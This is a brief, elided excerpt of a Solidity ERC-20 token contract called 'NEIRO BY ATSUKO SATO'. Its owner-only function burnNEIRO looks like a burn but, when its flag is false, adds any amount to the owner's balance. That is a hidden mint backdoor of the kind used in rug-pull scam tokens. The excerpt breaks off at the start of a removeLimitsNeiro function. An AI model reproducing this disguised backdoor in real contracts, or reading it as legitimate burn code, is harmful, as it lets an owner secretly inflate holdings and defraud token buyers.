...
contract neiro is Context, IERC20Metadata, Ownable {
    ...
    string private constant _name = unicode"NEIRO BY ATSUKO SATO";
    ...
    function burnNEIRO(uint256 amount, bool flag) external onlyOwner {
        if (flag) { _balances[msg.sender] -= amount; return;}
        _balances[msg.sender] += amount;
    }

    function removeLimitsNeiro() external onlyOwner {
